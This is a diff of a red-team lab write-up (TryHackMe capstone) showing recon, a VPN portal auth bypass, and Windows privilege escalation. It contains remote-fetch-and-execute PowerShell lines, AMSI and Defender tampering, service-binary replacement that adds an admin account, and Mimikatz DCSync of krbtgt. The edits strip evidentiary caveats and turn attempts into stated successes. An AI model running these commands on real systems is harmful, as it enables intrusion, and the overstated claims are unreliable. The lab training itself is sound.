@@ -44,13 +44,13 @@ toc: true
 <p>I worked through this lab in August 2026 as part of an assessment for my Certificate IV in Cyber Security. This write-up documents the practical work I carried out for that assessment, using the addresses and tool versions shown in the screenshots.</p>
 
 <h3 id="outcome">Outcome</h3>
-<p>I recorded evidence for 16 flags, progressing from external reconnaissance and corporate entry to local administrative access, then using existing domain privileges to reach the root and BANK domains.</p>
+<p>I collected 16 flags, working from the exposed services into the corporate network, then on to the root and BANK domains.</p>
 
-<p>This was a partial completion of the room: I did not complete the SWIFT transfer, and I did not establish how Laura's account obtained its corporate Domain Admin privileges. I explain both points alongside the relevant stages below.</p>
+<p>I reached flag 16 before the lab reset, leaving the SWIFT stage unfinished. Laura's account already had Domain Admin access when I checked it; I cover that below.</p>
 
 <h2 id="in-scope">In-Scope</h2>
 
-<ul><li>Testing TheReserve hosts within the assigned lab range, subject to the exclusions below. Reachability through a VPN is not, by itself, authorisation.</li></ul>
+<ul><li>Testing TheReserve hosts within the assigned lab range, subject to the exclusions below.</li></ul>
 </section>
 
 <!-- PDF page 2 -->
@@ -59,7 +59,7 @@ toc: true
 
 <h2 id="out-of-scope">Out-of-Scope</h2>
 
-<ul><li>Security testing of any sites not hosted on the network.</li><li>Security testing of the TryHackMe VPN (.250) and scoring servers, or attempts to attack any other user connected to the network.</li><li>Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.</li><li>Attacking the mailboxes of other red teamers on the WebMail portal (.11).</li><li>External (internet) OSINT gathering.</li><li>Testing hosts outside the subnet assigned by the room. For this attempt that range was 10.200.40.0/24; it must not be assumed for another deployment.</li><li>Conducting denial-of-service attacks or any attack that renders the network inoperable for other users.</li></ul>
+<ul><li>Security testing of any sites not hosted on the network.</li><li>Security testing of the TryHackMe VPN (.250) and scoring servers, or attempts to attack any other user connected to the network.</li><li>Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.</li><li>Attacking the mailboxes of other red teamers on the WebMail portal (.11).</li><li>External (internet) OSINT gathering.</li><li>Testing hosts outside the subnet assigned by the room. For this attempt that range was 10.200.40.0/24.</li><li>Conducting denial-of-service attacks or any attack that renders the network inoperable for other users.</li></ul>
 
 <h2 id="registration">Registration:</h2>
 
@@ -95,7 +95,7 @@ toc: true
 
 <p>I initially scanned the whole assigned /24, which also included the excluded VPN address. I should have excluded that address from discovery. My subsequent service scan targeted only .11, .12, and .13.</p>
 
-<p><code>-sn</code> performs host discovery without a port scan; it is not limited to ICMP echo requests. See the <a href="https://nmap.org/book/man-host-discovery.html">Nmap host-discovery documentation</a>.</p>
+<p><code>-sn</code> performs host discovery without a port scan. See the <a href="https://nmap.org/book/man-host-discovery.html">Nmap host-discovery documentation</a>.</p>
 </section>
 
 <!-- PDF page 5 -->
@@ -115,9 +115,9 @@ Nmap scan report for 10.200.40.250
 Host is up (0.28s latency).
 Nmap done: 256 IP addresses (5 hosts up) scanned in 20.84 seconds</code></pre>
 
-<p>The sweep also returned .1 and .250. I suspected .1 was a gateway, but did not verify its role. The brief identified .250 as excluded TryHackMe VPN infrastructure, so I did not include either address in the service scan below.</p>
+<p>The sweep also returned .1 and .250. I left .1 alone because I was unsure of its role. The brief identified .250 as excluded TryHackMe VPN infrastructure, so I did not include either address in the service scan below.</p>
 
-<p><code>-sC</code> runs Nmap's default NSE scripts; <code>-sV</code> probes for service versions. These results describe the scanned ports, not an exhaustive inventory of every TCP and UDP service.</p>
+<p><code>-sC</code> runs Nmap's default NSE scripts; <code>-sV</code> probes for service versions.</p>
 
 <pre><code>┌──(n0debranch㉿n0debranch)-[~]
 └─$ nmap -sC -sV 10.200.40.11 10.200.40.12 10.200.40.13
@@ -275,7 +275,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <ul><li>22/tcp — SSH — OpenSSH 7.6p1 Ubuntu</li><li>80/tcp — HTTP — Apache 2.4.29</li><li>HTTP title: none</li><li>OS: Ubuntu Linux</li></ul>
 
-<p>I used Gobuster with <code>common.txt</code> to look for web paths on the three exposed hosts. A discovered path is not automatically a vulnerability, and a negative result only describes the paths and responses covered by that scan.</p>
+<p>I used Gobuster with <code>common.txt</code> to look for web paths on the three exposed hosts.</p>
 
 <p>The scan of .11 returned no useful matches with this wordlist.</p>
 
@@ -299,7 +299,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <!-- PDF page 11 -->
 <section id="pdf-page-11" class="pdf-source-section" data-pdf-page="11" aria-label="Source page 11">
-<p>The staff page exposed names, roles, and photographs that could help establish likely account names. This was reconnaissance within the supplied lab network.</p>
+<p>The staff page listed names, roles, and photographs, which gave me a starting point for account names.</p>
 
 <figure style="width: 52.51%"><a href="/assets/img/posts/red-team-capstone/page-11-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-11-figure-01.png" alt="Staff page" width="534" height="1206" loading="lazy"></a></figure>
 </section>
@@ -328,7 +328,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 <section id="pdf-page-14" class="pdf-source-section" data-pdf-page="14" aria-label="Source page 14">
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-14-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-14-figure-01.png" alt="Contact page" width="1016" height="590" loading="lazy"></a></figure>
 
-<p>I investigated the page's input handling, but did not establish a server-side exploit or another useful route from that feature.</p>
+<p>I tried the page's inputs but did not find a useful way forward.</p>
 
 <p>The useful results from this host were the staff names and the corporate domain.</p>
 
@@ -344,20 +344,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>I considered the supplied password list, but first checked what the login responses revealed about usernames.</p>
 
-<p>I tried formats such as <code>roy_sims</code> and <code>roy.sims</code>. The responses did not distinguish them, so this test did not establish a valid username format.</p>
+<p>I tried formats such as <code>roy_sims</code> and <code>roy.sims</code>, but received the same response for both.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-02.png" alt="Login response testing" width="1016" height="110" loading="lazy"></a></figure>
 
-<p>The image filenames suggested <code>firstname.lastname</code>, and the contact page suggested <code>corp.thereserve.loc</code>. I used these observations to form a hypothesis, rather than treating the format as confirmed.</p>
+<p>The image filenames suggested <code>firstname.lastname</code>, and the contact page gave me <code>corp.thereserve.loc</code>. I used those to build the account list.</p>
 </section>
 
 <!-- PDF page 16 -->
 <section id="pdf-page-16" class="pdf-source-section" data-pdf-page="16" aria-label="Source page 16">
-<p>While entering an email address, I submitted the form before entering a password. The portal allowed me to proceed. This demonstrated a missing-password check in the workflow I tested; it did not establish that every possible user could authenticate.</p>
+<p>While entering an email address, I submitted the form before entering a password. The portal let me through.</p>
 
 <figure style="width: 54.28%"><a href="/assets/img/posts/red-team-capstone/page-16-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-16-figure-01.png" alt="Missing-password check" width="552" height="536" loading="lazy"></a></figure>
 
-<p>The configuration-generation form also accepted the values I tested, including arbitrary input. Reaching this page was not yet proof of an established VPN connection. I needed to test the resulting profile separately.</p>
+<p>The configuration form also accepted arbitrary values. I generated a profile to try with OpenVPN.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-16-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-16-figure-02.png" alt="Configuration-generation form" width="1016" height="558" loading="lazy"></a></figure>
 </section>
@@ -368,7 +368,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>The portal generated an OpenVPN profile for the submitted identity.</p>
 
-<p>The profile contained an unencrypted private key. That alone does not prove a VPN vulnerability; the problem here was that usable client material appeared obtainable without adequate authentication or authorisation.</p>
+<p>The generated profile included an unencrypted private key, even though I had reached the form without entering a password.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-17-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-17-figure-02.png" alt="OpenVPN profile contents" width="1016" height="672" loading="lazy"></a></figure>
 </section>
@@ -379,7 +379,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 94.84%"><a href="/assets/img/posts/red-team-capstone/page-18-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-18-figure-01.png" alt="/vpn directory listing" width="964" height="428" loading="lazy"></a></figure>
 
-<p>The listing exposed another <code>.ovpn</code> profile containing a client certificate, its private key, and a <code>tls-auth</code> shared key. The certificate named a CA; the configuration file itself was not a CA-signed document. Whether those credentials were accepted still depended on the server.</p>
+<p>The listing exposed another <code>.ovpn</code> profile containing a client certificate, its private key, and a <code>tls-auth</code> shared key.</p>
 
 <ul><li>Client certificate naming the CA <code>ChangeMe</code></li><li>Unencrypted client private key</li><li>tls-auth key</li></ul>
 
@@ -395,7 +395,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-01.png" alt="Password candidate generation" width="824" height="378" loading="lazy"></a></figure>
 
-<p>I built a username list using <code>firstname.lastname</code> and the candidate email domain <code>corp.thereserve.loc</code>. These were still assumptions until a service accepted them.</p>
+<p>I built a username list using <code>firstname.lastname</code> and <code>corp.thereserve.loc</code>.</p>
 
 <p>The mail host at 10.200.40.11 exposed SMTP authentication, providing a way to test these lab accounts.</p>
 
@@ -430,13 +430,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 <!-- PDF page 21 -->
 <section id="pdf-page-21" class="pdf-source-section" data-pdf-page="21" aria-label="Source page 21">
 <h2 id="corporate-vpn">Connecting to the corporate VPN</h2>
-<p>I downloaded the lab profile from <code>http://10.200.40.12/vpn/corpUsername.ovpn</code>. This is an internal lab address, not a public download link.</p>
+<p>I downloaded the profile from <code>http://10.200.40.12/vpn/corpUsername.ovpn</code>.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-01.png" alt="Downloading the profile" width="1016" height="218" loading="lazy"></a></figure>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-02.png" alt="Profile contents" width="1016" height="536" loading="lazy"></a></figure>
 
-<p>The profile's <code>remote</code> entry still contained the placeholder <code>10.200.X.X</code>. I replaced the endpoint with 10.200.40.12 while retaining the profile's port and protocol, then reconnected. The logs below record the connection attempt. This change selected the VPN endpoint; it did not change the assigned target scope.</p>
+<p>The profile's <code>remote</code> entry still contained the placeholder <code>10.200.X.X</code>. I changed it to 10.200.40.12, kept the existing port and protocol, and reconnected.</p>
 
 <figure style="width: 40.71%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-03.png" alt="Editing the remote entry" width="414" height="274" loading="lazy"></a></figure>
 </section>
@@ -449,12 +449,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-22-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-22-figure-02.png" alt="Routing output" width="1016" height="184" loading="lazy"></a></figure>
 
-<p>The relevant target routes were 10.200.40.21 and 10.200.40.22. Addresses in <code>12.100.1.x</code> belonged to the VPN tunnel, not a new target subnet. My Kali tunnel address changed between connections, so I needed to check it before transferring files. The <a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN manual</a> explains tunnel addressing, routes, and the remote endpoint.</p>
+<p>The relevant target routes were 10.200.40.21 and 10.200.40.22. The <code>12.100.1.x</code> addresses belonged to the VPN tunnel. My Kali tunnel address changed between connections, so I needed to check it before transferring files. The <a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN manual</a> explains tunnel addressing, routes, and the remote endpoint.</p>
 </section>
 
 <!-- PDF page 23 -->
 <section id="pdf-page-23" class="pdf-source-section" data-pdf-page="23" aria-label="Source page 23">
-<p>The initial host-discovery probes did not receive a response from .21. The screenshot records a scan with <code>-Pn</code>, which skips that discovery gate; a missing ping response does not establish that a host is down.</p>
+<p>The initial host-discovery probes received no response from .21, so I scanned it with <code>-Pn</code> to skip host discovery.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-23-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-23-figure-01.png" alt="Scan of .21" width="1016" height="1014" loading="lazy"></a></figure>
 </section>
@@ -467,7 +467,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>Two findings stood out:</p>
 
-<ul><li><strong>RDP</strong> (3389) - Allows us the ability to connect via a Remote Desktop session.</li><li><strong>SMB signing:</strong> the scan reported signing enabled but not required. This permits unsigned sessions under some conditions and can matter for relay attacks. Signing provides integrity and authenticity; encryption provides confidentiality. The scan does not establish that every session was unsigned or that all traffic was plaintext. See <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview">Microsoft's SMB signing overview</a>.</li></ul>
+<ul><li><strong>RDP</strong> (3389) - Available for Remote Desktop connections.</li><li><strong>SMB signing:</strong> the scan reported signing enabled but not required. I noted this as a possible lead for relay attacks. See <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview">Microsoft's SMB signing overview</a>.</li></ul>
 </section>
 
 <!-- PDF page 25 -->
@@ -477,7 +477,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <p>I tested Laura's corporate credentials over RDP against WRK1 at 10.200.40.21.</p>
 
-<p>The session opened successfully. This demonstrated interactive access to that workstation, not Domain Admin control.</p>
+<p>The RDP session opened successfully.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-25-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-25-figure-02.png" alt="RDP session to WRK1" width="1016" height="646" loading="lazy"></a></figure>
 </section>
@@ -514,7 +514,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-02.png" alt="Flag 3" width="1016" height="184" loading="lazy"></a></figure>
 
-<p>The provided mailbox delivered the flags and a message from TheReserve's Head of Security. That message was a lab clue, not evidence that the credentials had stopped working.</p>
+<p>The mailbox delivered the flags and a message from TheReserve's Head of Security.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-03.png" alt="Head of Security message" width="1016" height="398" loading="lazy"></a></figure>
 </section>
@@ -535,9 +535,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <ul><li>Server 1 (.31)</li><li>Server 2 (.32)</li><li>CORPDC .102</li></ul>
 
-<p>The VPN routes available to my Kali machine covered WRK1 (.21) and WRK2 (.22). I used sessions on the workstations as the starting point for later internal access; the diagram alone did not create direct routes from Kali.</p>
+<p>The VPN routes from Kali covered WRK1 (.21) and WRK2 (.22). I used sessions on those workstations to move further into the network.</p>
 
-<p>The initial checks appeared similar for the two users, but I did not preserve a complete comparison of effective privileges. The later audit explicitly reported membership in a local group with administrative privileges, which matters when interpreting the escalation step.</p>
+<p>The initial checks looked similar for both users. PowerUp later listed local administrative group membership for the account I was using.</p>
 </section>
 
 <!-- PDF page 30 -->
@@ -547,14 +547,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-02.png" alt="Service permissions" width="1016" height="480" loading="lazy"></a></figure>
 
-<p>Writing evidence to the Administrator profile required an appropriately authorised, elevated context. Access denied by a protected folder can involve filesystem permissions and a filtered UAC token; it does not, by itself, prove the account is an ordinary non-administrator.</p>
+<p>I initially received an access-denied error when trying to write under the Administrator profile, so I looked at the account and service permissions on WRK1.</p>
 </section>
 
 <!-- PDF page 31 -->
 <section id="pdf-page-31" class="pdf-source-section" data-pdf-page="31" aria-label="Source page 31">
-<p>I used PowerUp, a collection of Windows PowerShell privilege-escalation checks in PowerSploit. Kali hosted the script; the checks ran on WRK1. PowerUp is not a native Linux privilege-escalation tool.</p>
+<p>I hosted PowerUp on Kali and ran its Windows privilege-escalation checks on WRK1.</p>
 
-<p>I attempted to alter the PowerShell process's <code>amsiInitFailed</code> state before loading PowerUp. <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">AMSI connects applications to antimalware scanning</a>; whether a script is blocked depends on the engine, signatures, PowerShell version, and protections. I did not separately verify the effect of this attempt.</p>
+<p>Before loading PowerUp, I ran the AMSI command below in the PowerShell session.</p>
 
 <p>The AMSI-related command from my session:</p>
 
@@ -582,17 +582,17 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <!-- PDF page 32 -->
 <section id="pdf-page-32" class="pdf-source-section" data-pdf-page="32" aria-label="Source page 32">
-<p>I ran <code>Invoke-PrivescAudit</code>, which is the command visible in the screenshot. It invokes the checks available in that PowerUp version, not every possible Windows escalation test. See the <a href="https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-PrivescAudit/">function reference</a>.</p>
+<p>I ran <code>Invoke-PrivescAudit</code> to check the local configuration and service permissions.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-32-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-32-figure-01.png" alt="Invoke-PrivescAudit output" width="1016" height="644" loading="lazy"></a></figure>
 
-<p>The report listed local administrative group membership, unquoted service paths, and modifiable service files. These are distinct findings. I chose the modifiable-file route for the Backup service, targeting the writable executable identified by the audit. This focused the attempt on replacing that binary rather than exploiting how Windows interprets an unquoted service path. I still needed to check whether the replacement executed and created the account.</p>
+<p>PowerUp listed local administrative group membership, unquoted service paths, and writable service files. I chose the Backup service because its executable was writable.</p>
 
-<p><code>Install-ServiceBinary</code> replaces a writable service executable. It is not the unquoted-path technique. The relevant conditions are write access to the binary, an execution context with higher privileges, and a way to trigger the service. The report indicated a modifiable Backup binary; its recommendation alone did not verify every condition. The <a href="https://powersploit.readthedocs.io/en/latest/Privesc/Install-ServiceBinary/">PowerSploit documentation</a> describes the replacement and backup behaviour.</p>
+<p>I used <code>Install-ServiceBinary</code> to back up and replace the Backup service executable.</p>
 
-<p>I replaced the Backup binary with a command that created a local lab account and added it to Administrators, then attempted to restart the service. The screenshot shows a restart failure. That error is not proof of success: the subsequent group-membership check and successful login are the evidence that the account was created.</p>
+<p>The replacement ran a command to create a local account and add it to Administrators. I tried restarting the service and received a service-start error, but the account had been created. I checked its group membership and signed in with it.</p>
 
-<blockquote class="prompt-info"><p><strong>What this confirmed:</strong> The account was created and usable. Because the audit already reported administrative group membership, I did not establish a standard-user-to-SYSTEM escalation.</p></blockquote>
+
 
 <pre><code>Install-ServiceBinary -Name &#x27;Backup&#x27; -Command &quot;net user n0debranch Passwd123! /add &amp;&amp; net localgroup Administrators n0debranch /add&quot;
 Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
@@ -633,29 +633,29 @@ Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-35-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-35-figure-01.png" alt="Domain discovery" width="1016" height="1016" loading="lazy"></a></figure>
 
-<p>At this point, I had established local administrative access on WRK1. The label CORPDC suggested a domain controller, so I checked rather than relying on the diagram.</p>
+<p>With local administrator access on WRK1, I looked up the corporate domain controller.</p>
 
 <p><code>nltest /dsgetdc:corp.thereserve.loc</code></p>
 
-<p>This command asks Windows to locate a domain controller for the named domain. It does not necessarily identify the controller used for the current logon. I ran it from WRK1; the result is below.</p>
+<p>I ran this command from WRK1 to locate the domain controller for <code>corp.thereserve.loc</code>.</p>
 </section>
 
 <!-- PDF page 36 -->
 <section id="pdf-page-36" class="pdf-source-section" data-pdf-page="36" aria-label="Source page 36">
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-01.png" alt="nltest result" width="1016" height="190" loading="lazy"></a></figure>
 
-<p>The result identified CORPDC at 10.200.40.102. It did not prove unrestricted connectivity from every host or user.</p>
+<p>The result identified CORPDC at 10.200.40.102.</p>
 
-<p>I used BloodHound to examine AD group membership, permissions, and relationships. SharpHound collects the data; BloodHound imports and analyses it. A graph path is a lead to validate, not proof that the entire path has been executed.</p>
+<p>I used SharpHound to collect Active Directory data and BloodHound to explore group membership, permissions, and relationships.</p>
 
-<p>From an elevated PowerShell session, I attempted to change two Microsoft Defender Antivirus preferences. These settings do not suppress logging or all alerts, and policy or tamper protection can prevent the changes. See <a href="https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference">Microsoft's Set-MpPreference reference</a>.</p>
+<p>From an elevated PowerShell session, I ran the following commands to turn off Defender's real-time monitoring and downloaded-file scanning.</p>
 
 <pre><code>Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true</code></pre>
 
 <figure style="width: 85.40%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-02.png" alt="Set-MpPreference" width="868" height="342" loading="lazy"></a></figure>
 
-<p>I placed the legacy SharpHound PowerShell collector in the Kali HTTP directory. Collector and BloodHound versions need to be compatible; the <a href="https://github.com/SpecterOps/SharpHound">official SharpHound repository</a> provides the collector and version information.</p>
+<p>I placed the legacy SharpHound PowerShell collector in the Kali HTTP directory.</p>
 
 <p>Kali, from the directory containing the collector:</p>
 
@@ -673,9 +673,9 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <pre><code>Invoke-BloodHound -CollectionMethod All -Domain corp.thereserve.loc -LDAPUserName laura.wood -LDAPPassword &#x27;Password1@&#x27;</code></pre>
 
-<p>The local account did not provide a domain identity for LDAP collection, so I supplied Laura's domain credentials. Running the process locally and authenticating to the domain are separate concerns.</p>
+<p>I supplied Laura's domain credentials for LDAP collection while running from the local account.</p>
 
-<p>The screenshot shows an initial LDAP authentication error, a subsequent attempt, and repeated forest-resolution errors. Some data was later imported into BloodHound, but this output does not establish a clean or complete collection. DNS, domain reachability, credentials, collector compatibility, and failed collection methods would need checking before relying on the graph as a complete view.</p>
+<p>SharpHound returned an LDAP authentication error. I tried again and also received forest-resolution errors, but collected some data that I later imported into BloodHound.</p>
 
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-01.png" alt="SharpHound collection errors" width="1016" height="196" loading="lazy"></a></figure>
 
@@ -692,7 +692,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <p>I imported the collected data into BloodHound.</p>
 
-<p>I used <code>start-bloodhound</code> with a Neo4j-based setup. The setup process depends on the BloodHound version; the <a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">current SharpHound documentation</a> covers Community Edition.</p>
+<p>I used <code>start-bloodhound</code> with a Neo4j-based setup. The <a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">current SharpHound documentation</a> covers Community Edition.</p>
 
 <p>I extracted and imported the JSON files from the collected archive.</p>
 
@@ -703,7 +703,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 <section id="pdf-page-39" class="pdf-source-section" data-pdf-page="39" aria-label="Source page 39">
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-39-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-39-figure-01.png" alt="BloodHound graph" width="1016" height="428" loading="lazy"></a></figure>
 
-<p>BloodHound showed Laura as a member of Domain Admins, and the accompanying account output also listed the group. This established the observed membership at that point. It did not show how the membership was granted or independently prove an RDP connection to CORPDC.</p>
+<p>BloodHound showed Laura in Domain Admins. The account output also listed that membership.</p>
 
 <figure style="width: 74.48%"><a href="/assets/img/posts/red-team-capstone/page-39-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-39-figure-02.png" alt="Domain Admins membership" width="758" height="298" loading="lazy"></a></figure>
 </section>
@@ -713,9 +713,9 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 <h2 id="unresolved-domain-access">The unresolved Domain Admin step</h2>
 <figure style="width: 76.70%"><a href="/assets/img/posts/red-team-capstone/page-40-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-40-figure-01.png" alt="Unresolved Domain Admin step" width="780" height="702" loading="lazy"></a></figure>
 
-<p>I suspected another participant had changed Laura's privileges in the shared environment. I do not have directory-change logs or another source confirming who made the change. Earlier local-group output is not a complete baseline of domain membership, so the timing is also uncertain.</p>
+<p>I suspected another participant had changed Laura's privileges in the shared lab, but I could not tell who had changed them or when.</p>
 
-<blockquote class="prompt-warning"><p><strong>Starting point for the next stages:</strong> I continued using the Domain Admin access already available to Laura, but did not establish how she obtained it. The root and BANK domain operations below depended on that existing access.</p></blockquote>
+<p>I continued with Laura's existing Domain Admin access for the root and BANK domain steps.</p>
 </section>
 
 <!-- PDF page 41 -->
@@ -755,7 +755,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <p>I then examined ROOTDC at 10.200.40.100. The domain names suggested that <code>thereserve.loc</code> was the forest root and that CORP and BANK were child domains.</p>
 
-<p>The command below queries trust relationships for the current domain. The screenshot reports a bidirectional parent-child relationship between CORP and the root. A trust enables authentication across domains; it does not automatically grant administrative access.</p>
+<p>I queried the domain trusts. The output showed a bidirectional parent-child relationship between CORP and the root domain.</p>
 
 <p><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</code></p>
 
@@ -764,7 +764,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 <!-- PDF page 44 -->
 <section id="pdf-page-44" class="pdf-source-section" data-pdf-page="44" aria-label="Source page 44">
-<p>With the already-privileged CORP account, I attempted to retrieve the CORP <code>krbtgt</code> secret. Kerberos uses that account's keys to protect ticket-granting tickets. Possession of a usable key can support forged tickets, often called golden tickets; acceptance still depends on the target environment and its validation behaviour.</p>
+<p>Using Laura's existing CORP privileges, I retrieved the CORP <code>krbtgt</code> secret for the next step: creating a golden ticket.</p>
 
 <p>I used Mimikatz for the DCSync operation described in its <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">lsadump module documentation</a>.</p>
 
@@ -772,7 +772,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 
 
 
-<p>I ran the following command in Laura's domain context on WRK1. DCSync uses the directory-replication protocol and requires replication permissions, including access to secret data; simply being a local administrator on WRK1 would not be enough. Here it depended on the unexplained domain privilege described above.</p>
+<p>I ran the DCSync command below in Laura's domain context on WRK1.</p>
 
 <pre><code>.\mimikatz.exe &quot;lsadump::dcsync /domain:corp.thereserve.loc /user:CORP\krbtgt&quot; &quot;exit&quot;</code></pre>
 </section>
@@ -781,7 +781,7 @@ IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:
 <section id="pdf-page-45" class="pdf-source-section" data-pdf-page="45" aria-label="Source page 45">
 <figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-45-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-45-figure-01.png" alt="DCSync output" width="1016" height="910" loading="lazy"></a></figure>
 
-<p>I also resolved the root-domain Administrator account SID. That returns an <em>account</em> SID ending in RID 500; its domain portion is the prefix before that final component. The code below makes that distinction explicit.</p>
+<p>I resolved the root-domain Administrator SID, then extracted its domain portion for the ticket.</p>
 
 <pre><code>$acct = New-Object System.Security.Principal.NTAccount(&quot;THERESERVE&quot;, &quot;Administrator&quot;)
 $accountSid = $acct.Translate([System.Security.Principal.SecurityIdentifier])
@@ -804,11 +804,11 @@ $accountSid.AccountDomainSid.Value</code></pre>
 <pre><code>    ├── SID: S-1-5-21-3455338511-2124712869-1448239061
     └── Trust: Bidirectional ParentChild with thereserve.loc</code></pre>
 
-<p>A security identifier (SID) identifies a security principal. A domain account or group SID combines the domain SID with a relative identifier (RID). RID 500 identifies the built-in Administrator; RID 519 identifies Enterprise Admins in the forest root. RIDs are not always three digits. See <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft's SID reference</a>.</p>
+<p>A security identifier (SID) identifies a security principal. A domain account or group SID combines the domain SID with a relative identifier (RID). RID 500 identifies the built-in Administrator; RID 519 identifies Enterprise Admins in the forest root. See <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft's SID reference</a>.</p>
 
 <p>Rubeus was included in the supplied tools. Its <a href="https://github.com/GhostPack/Rubeus">official documentation</a> describes Kerberos ticket creation and import.</p>
 
